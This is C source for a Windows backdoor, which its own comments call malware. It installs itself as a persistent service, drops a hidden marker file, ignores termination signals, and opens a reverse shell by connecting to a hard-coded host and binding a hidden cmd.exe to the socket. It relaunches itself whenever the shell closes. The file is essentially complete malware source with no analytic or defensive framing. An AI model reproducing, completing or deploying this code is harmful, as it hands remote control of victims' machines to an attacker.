#include "main.h"
 
void
main( int argc , char ** argv , char ** envp )
{
	// create signals handler, in order to avoid preemption
	SignalHandler();

    SOCKET sockfd;
    int ld_res = 0;
    int FResult = 0;
    int SvcResult = 1;
 
    FResult = CreateFileRunnable();
     
    /* A file has been created only to check if the ServiceName of the process has already been created, if the file does not
    * exists, it means its the first time the malware is running on the target machine, the content of the file == NULL.
    */
    if(  FResult == FILE_EXIST )
	{
		printf("A file ja existe!\n");
        goto SvcResultado;
	}
    else
	{
		printf("File Não Existe!\n");
        SvcResult = CreateServiceName();
	}
    // Now, Loads the Service, i.e., make it runs.
SvcResultado:
    if( SvcResult == 0 )
        goto direct;
 
    ld_res = LoadMyService();
 
 
    // Create the socket connection to the Host-Machine
 
direct:
    sockfd = MakeConnection();
 
    // If the loading fails, ExitProcess(1);
    if( ld_res != 0)
    {
        ExitProcess(1);
    }
 
    // if the socket connection does not fail, proceed.
    if( sockfd != ( (SOCKET) EXIT_FAILURE ) )
    {
 
        MakeCommunication( sockfd , argc , argv , envp );
    }
}
 
 
SOCKET
MakeConnection()
{
	printf("MakeConnection!\n");
 
 
    char host_ip[] = "192.168.1.35";
    u_short port = 80;
 
    WSADATA wsa;
    WORD ver = MAKEWORD( 2 , 2 );
    int wsa_status = WSAStartup( ver , &wsa );
    if (wsa_status != 0)
    {
        return ( (SOCKET) EXIT_FAILURE );
    }
 
    SOCKET sockfd = WSASocket( PF_INET , SOCK_STREAM ,  IPPROTO_TCP , NULL , 0 , WSA_FLAG_MULTIPOINT_C_ROOT );
 
 
    struct sockaddr_in host;
    host.sin_port = htons( port ); host.sin_family = AF_INET ; host.sin_addr.s_addr = inet_addr( host_ip ); ZeroMemory( host.sin_zero , sizeof( host.sin_zero ) );
 
    int namelen = sizeof( host );
    int c_counter = 0 , c_res = 0;
    for( c_counter ; c_counter != 5 ; c_counter ++ )
    {
		printf("Tentativa: %d\n", c_counter);
        c_res = connect( sockfd , ( struct sockaddr * ) &host , namelen );
        if(c_res != 0 )
        {
            sleep(10);
            continue;
        }
        else
		{
			printf("Conectou!\n");
            break;
		}
    }
 
    if ( c_counter == 4 )
    {
        return ( (SOCKET) EXIT_FAILURE );
    }
 
    return ( sockfd );
}
 
 
void MakeCommunication( SOCKET sockfd , int argc , char ** argv , char ** envp )
{
 
	printf("MakeCommunication()!\n");
 
    STARTUPINFOA si;
     
    // pass the socket file descriptor to the stdout, stdin, stderr do cmd.exe
    si.hStdOutput = (HANDLE) sockfd;
    si.hStdInput = (HANDLE) sockfd;
    si.hStdError = (HANDLE) sockfd;
    // do not show the cmd.exe window
    si.wShowWindow = SW_HIDE;
    // size of the structure in bytes
    si.cb = sizeof(si);
     
    PROCESS_INFORMATION pi;
     
    ZeroMemory( &pi , sizeof( pi ) );
    // If the functions fails to create a process, it will call main, and reset the process
    if( !CreateProcessA( NULL , "cmd.exe\0" , NULL , NULL , TRUE , 0 , NULL , NULL , &si , &pi ) )
    {
		closesocket( sockfd );
        main( argc, argv , envp );
    }
 
 
    // wait for the cmd.exe to close, when it happens, it reset the process , its a persistence feature
    WaitForSingleObject( pi.hProcess , INFINITE );
    CloseHandle( pi.hProcess );
	closesocket( sockfd );
    main( argc , argv , envp );
}
 
 
 
 
/* Load the service, used only when the service has already been registered. */
int LoadMyService()
{
 
    SC_HANDLE OpenSCHandle;
    SC_HANDLE OpenServiceHandle;
 
    OpenSCHandle = OpenSCManagerA( NULL , NULL , SC_MANAGER_ALL_ACCESS );
    if( OpenSCHandle != NULL )
    {
        OpenServiceHandle = OpenServiceA( OpenSCHandle ,  SystemServiceName , SC_MANAGER_ALL_ACCESS );
        if(OpenServiceHandle != NULL)
        {
            CloseServiceHandle( OpenServiceHandle );
        }
        CloseServiceHandle( OpenSCHandle );
    }
 
    return ( EXIT_SUCCESS );
}
 
 
 
 
/* Create the service and start it! */
int CreateServiceName()
{
 
	printf("CreateServiceName()!\n");
    SC_HANDLE hSCManager;
    SC_HANDLE HcSvc;
 
 
    ZeroMemory ( ProcessExecutablePath , sizeof ( ProcessExecutablePath ) );
    ZeroMemory ( ProcessExecutablePath_CmdLine , sizeof ( ProcessExecutablePath_CmdLine ) );
 
    GetModuleFileNameA( NULL , ProcessExecutablePath  , 260 );
 
    sprintf( ProcessExecutablePath_CmdLine , "%s -m security\0" , ProcessExecutablePath );
 
    hSCManager = OpenSCManagerA( NULL , NULL , SC_MANAGER_ALL_ACCESS );
 
    if ( hSCManager != NULL )
    {
        HcSvc = CreateServiceA( hSCManager ,  SystemServiceName , MicroSvc , SC_MANAGER_ALL_ACCESS , 16 , 2 , 1 ,  ProcessExecutablePath_CmdLine , NULL , NULL , NULL , NULL , NULL );
        if( hSCManager != NULL )
        {
            StartServiceA( HcSvc , 0 , NULL );
            CloseServiceHandle( HcSvc );
        }
        CloseServiceHandle( hSCManager );
    }
 
    return 0;
}
 
 
// Create File To Change program Activitate
int CreateFileRunnable()
{  
 
    OFSTRUCT FileStructure;
 
    HANDLE HFile;
 
    DWORD ErrorCode;
 
    LPSTR username = NULL;
	
    ZeroMemory ( FileName , sizeof( FileName ) );
 
 
    username = getenv( "USERNAME" );
	
    if( username == NULL )
    {
        return ( EXIT_FAILURE );
    }
 
 
    // Store in FileName
    sprintf( FileName , "C:\\Users\\%s\\InstallAgentW\0" , username );
 
    HFile = CreateFileA( TEXT(FileName) , GENERIC_WRITE , 0 , NULL , CREATE_NEW , FILE_ATTRIBUTE_HIDDEN , NULL );
 
    // pre-check
    if ( HFile == INVALID_HANDLE_VALUE )
    {
        // check if the file already exists
        ErrorCode = GetLastError();
        if( ErrorCode == (DWORD) 80 )
        {
            goto Out;
        }
 
        else
        {
            CloseHandle( HFile );
            return FILE_ERROR;
        }
    }
    else
    {
        return FILE_DNT_EXIST;
    }
 
 
Out:
    CloseHandle ( HFile );
    return ( FILE_EXIST );
}


void SignalHandler()
{
	signal( SIGABRT , SIG_IGN );
	signal( SIGFPE , SIG_IGN );
	signal( SIGILL , SIG_IGN );
	signal( SIGINT , SIG_IGN );
	signal( SIGTERM , SIG_IGN );
	
	return;
}

int GetWindowsN( SOCKET sockfd )
{



	while( TRUE )
	{

	}

	return 0;
}